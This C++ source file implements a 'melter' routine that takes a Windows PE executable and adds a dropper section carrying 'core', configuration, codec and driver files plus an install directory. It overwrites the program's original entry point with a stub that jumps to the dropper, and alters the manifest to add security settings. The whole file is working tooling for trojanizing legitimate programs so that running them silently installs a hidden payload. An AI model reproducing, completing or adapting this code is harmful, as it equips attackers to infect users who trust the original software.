#include <cstdio>
#include <iomanip>
#include <iostream>
#include <iterator>
#include <fstream>
#include <string>
#include <vector>

using namespace std;

#include <boost/filesystem.hpp>
namespace bf = boost::filesystem;

#include "Exceptions.h"
#include "FileBuffer.h"
#include "PEObject.h"
#include "DropperSection.h"
#include "Manifest.h"
#include "ResourceSection.h"
#include "retcodes.h"

#include "MeltFile.h"

#include "../mxml/mxml.h"

#define VERSION "2009042701"

void print_hex(char const * const data, std::size_t length)
{
	for (std::size_t j = 0; j < length; j++) {
		if (data[j] > 33 && data[j] < 126)
			printf("%c", data[j]);
		else
			printf(".");
		if ((j != 0) && (j % 32 == 0))
			printf("\r\n");
	}
}

int MeltFile( char const * const input_path, char const * const output_path, MelterStruct const * const melter_data ) {
	RawBuffer* buffer = new RawBuffer(bf::path(input_path));
	
	if (buffer->size() == 0) {
		cout << "File is 0 bytes long." << endl;
		return RETCODE_FAIL_OTHER;
	}
	
	if (buffer->open() == false) {
		cout << "Failed opening file." << endl;
		return RETCODE_FAIL_OTHER;
	}
	
	// we do not want the original file to be modified
	char* data = new CHAR[buffer->size()];
	size_t size = buffer->size();
	
	memcpy(data, buffer->const_data(), size);
	
	//buffer->close();
	delete buffer;
	
	PEObject* object = new PEObject(data, size);
	if (object->parse() == false) {
		delete [] data;
		return RETCODE_FAIL_INVALID;
	}
	//object->saveOEP();
	
	if (object->isAuthenticodeSigned()) 
	{
		cout << "File is AUTHENTICODE SIGNED." << endl;
	}
	
	//
	// DROPPER SECTION
	//
	
	DropperSection* section = object->createDropperSection(".000");
	
	section->setOriginalOEPCode((unsigned char*) object->GetOEPCode(), OEPSTUBSIZE);
	section->setExitProcessIndex(object->exitProcessIndex());
	section->setExitIndex(object->exitIndex());
	
	bf::path core_path = melter_data->core;
	bf::path conf_path = melter_data->conf;
	bf::path codec_path = melter_data->codec;
	bf::path driver_path = melter_data->driver;
	
	section->addCoreFile(core_path.string(), core_path.filename());
	section->addConfigFile(conf_path.string(), conf_path.filename());
	section->addCodecFile(codec_path.string(), codec_path.filename());
	section->addDriverFile(driver_path.string(), driver_path.filename());
	
	section->addInstallDir(std::string(melter_data->instdir));
	section->addExecutableName(core_path.filename());
	
	DWORD ep_offset = section->build( (WINSTARTFUNC) object->EntryPoint_VA() );
	
	// **
	// *** New Entry Point stub
	// **
	
	DWORD epVA = object->ntHeaders()->OptionalHeader.ImageBase + section->VirtualAddress() + ep_offset - 1;
	
	oepStub[ADDRBYTE4] = epVA;
	oepStub[ADDRBYTE3] = (epVA & 0x0000FF00) >> 8;
	oepStub[ADDRBYTE2] = (epVA & 0x00FF0000) >> 16;
	oepStub[ADDRBYTE1] = (epVA & 0xFF000000) >> 24;
	
	object->WriteData(object->EntryPoint_RVA(), (char*)oepStub, OEPSTUBSIZE);
	
	//
	//	RESOURCE SECTION
	//
	
	if (melter_data->manifest) {
		GenericSection* resSection = object->getSection(IMAGE_DIRECTORY_ENTRY_RESOURCE);
		if (!resSection) {
			
		} else {
			cout << "Original resource section size: " << dec << resSection->size() << endl;
			ResourceSection* resourceSection = new ResourceSection(*resSection); 
			object->appendSection(resourceSection->GetBase());
			object->setSection(IMAGE_DIRECTORY_ENTRY_RESOURCE, resourceSection->GetBase());
			cout << "New resource section size: " << dec << ((GenericSection*)resourceSection)->size() << endl;
			ResourceDirectory* rdDir = NULL;
			try {
				rdDir = resourceSection->ScanDirectory();
			} catch (InvalidResourcesException& e) {
				cout << e.what() << endl;
				delete [] data;
				return RETCODE_FAIL_INVALID;
			}
			
			resourceSection->SetName(".rsr2");
			
			if (rdDir)
			{
				// *** Get MANIFEST
				WCHAR* resType = RT_MANIFEST;
				int typeIdx = rdDir->Find(resType);
				if (typeIdx == -1) {

				}

				if (typeIdx == -1) 
				{
					// we don't have a manifest entry, add everything
					Manifest* manifest = new Manifest();
					manifest->Create();
					resourceSection->UpdateResource(
						resType,
						(WORD)1, 
						(LANGID)0, 
						(PBYTE)manifest->toCharPtr(), 
						manifest->size());
				}
				else
				{
					ResourceDirectory* nameDir = rdDir->GetEntry(typeIdx)->GetSubDirectory();
					int nameIdx = nameDir->Find(1);
					if (nameIdx > -1)
					{
						ResourceDirectory* langDir = nameDir->GetEntry(nameIdx)->GetSubDirectory();
						int langIdx = langDir->Find((WORD)0);
						if (langDir->CountEntries() > 0) {
							// get first entry, we do not care of language for manifest
							ResourceDataEntry* dataEntry = langDir->GetEntry(0)->GetDataEntry();
							if (dataEntry) {
								PCHAR manifest = new CHAR[dataEntry->GetSize()];
								memset(manifest, 0, dataEntry->GetSize());
								memcpy(manifest, dataEntry->GetData(), dataEntry->GetSize());
								cout << endl << "MANIFEST: " << endl << endl << manifest << endl;

								// MANIFEST MANGLING
								Manifest* m = new Manifest(string(manifest));
								m->AddSecurityInfo();

								cout << endl << "MANGLED: " << endl << endl << m->toString() << endl;

								dataEntry->SetAdded(true);
								dataEntry->SetData((PBYTE)m->toCharPtr(), m->size(), dataEntry->GetCodePage());

								delete [] manifest;
								delete m;
							}
						}
					}
				}
			}
			
			resourceSection->WriteResources();
		}
	}
	
	// SAVE FILE, FINALLY
	object->saveToFile( output_path );
	
	delete [] data;

	return RETCODE_SUCCESS;
}
